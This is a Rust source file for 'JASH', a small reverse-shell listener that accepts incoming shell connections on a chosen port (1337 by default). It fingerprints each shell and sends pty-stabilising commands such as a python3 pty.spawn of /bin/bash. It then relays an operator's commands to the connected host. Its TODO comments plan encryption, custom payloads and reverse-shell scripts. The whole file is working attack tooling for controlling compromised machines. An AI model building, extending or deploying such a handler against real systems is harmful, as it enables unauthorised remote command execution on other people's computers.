//Keep IDE clean (Its a unfinished project YOUR GONNA HAVE UNUSED FUNC'S)
#![allow(unused_imports)]
#![allow(unused_variables)]
#![allow(unused_mut)]
#![allow(dead_code)]

//To do stuff
//Encryption
//custom payloads
//tabs (makes sessions more fluid)
//sessions
//nice colouring
//Make some custom revshell scripts
//
use std::env;
use std::io::ErrorKind;
use std::io::{self, Read, Write, stdout};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::time::Duration;

// Banner printing
fn banner(ip: &str, shell: &str) {
    println!("{}", "=".repeat(12));
    println!("Connection to: {}", ip);
    println!("Shell:  {}", shell);
    println!("{}", "=".repeat(12));
}

// Shell stabilize commands
fn stablise_shell(mut stream: &TcpStream) {
    let _ = stream.write_all(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n");
    let _ = stream.write_all(b"export TERM=xterm\n");
    let _ = stream.write_all(b"stty rows 40 columns 120\n");
}

// Read all available data from stream with timeout and no hanging
fn read_available(mut stream: &TcpStream) -> io::Result<String> {
    let mut response = Vec::new();
    let mut buffer = [0u8; 1024];

    // Set short read timeout so read won't block forever
    stream.set_read_timeout(Some(Duration::from_millis(500)))?;

    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                // Connection closed
                break;
            }
            Ok(n) => {
                response.extend_from_slice(&buffer[..n]);
                if n < buffer.len() {
                    // No more data immediately available
                    break;
                }
            }
            Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                // No data ready, stop reading for now
                break;
            }
            Err(ref e) if e.kind() == ErrorKind::TimedOut => {
                // Timeout expired, stop reading
                break;
            }
            Err(e) => return Err(e),
        }
    }
    Ok(String::from_utf8_lossy(&response).to_string())
}

// Handle each client connection
fn handle_clients(mut stream: TcpStream, addr: String) {
    // Set timeout for initial shell type read
    stream
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();

    // Attempt to get shell type
    let _ = stream.write_all(b"echo $0\n");
    let shell_type = match read_available(&stream) {
        Ok(s) if !s.trim().is_empty() => s.trim().to_string(),
        _ => "Unknown".to_string(),
    };

    banner(&addr, &shell_type);
    stablise_shell(&stream);

    let mut stdin = io::stdin();
    let mut stdout = stdout();

    loop {
        print!("Shell> ");
        stdout.flush().unwrap();

        let mut input = String::new();
        if stdin.read_line(&mut input).is_err() {
            println!("[!!] Failed to read input");
            break;
        }

        if input.trim() == "exit" {
            println!("[!!] Closing connection to > {}", addr);
            break;
        }

        if stream.write_all(input.as_bytes()).is_err() {
            println!("Connection closed by > {}", addr);
            break;
        }

        match read_available(&stream) {
            Ok(output) => {
                if !output.is_empty() {
                    print!("{}", output);
                    stdout.flush().unwrap();
                }
            }
            Err(e) => {
                println!("[!] Error reading from {}: {}", addr, e);
                break;
            }
        }
    }
}

fn main() -> io::Result<()> {
    // Reads port from arg or use default 1337
    let args: Vec<String> = env::args().collect();
    let port = if args.len() > 1 {
        args[1].clone()
    } else {
        String::from("1337")
    };
    if args.len() > 1 {
        match args[1].as_str() {
            "--version" | "-v" => {
                println!("JASH v0.1.0 Anne");
                return Ok(());
            }
            "--help" | "-h" => {
                println!("Usage: jash <port>");
                println!("Example: jash 1337");
                return Ok(());
            }
            _ => {
                // Unknown flag, continue as normal
            }
        }
    }

    // Bind listener
    let bind_addr = format!("0.0.0.0:{}", port);
    let listener = TcpListener::bind(&bind_addr)?;
    println!("listener started {}", bind_addr);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let addr = stream
                    .peer_addr()
                    .map(|a| a.to_string())
                    .unwrap_or_else(|_| String::from("Unknown"));
                println!("[*] Connection from > {} ", addr);

                thread::spawn(move || {
                    handle_clients(stream, addr);
                });
            }
            Err(e) => {
                println!("[!] Connection failed: {}", e);
            }
        }
    }
    Ok(())
}

// Copyright (c) 2025 MuteAvery
// Licensed under the MIT License. See LICENSE file in the project root.
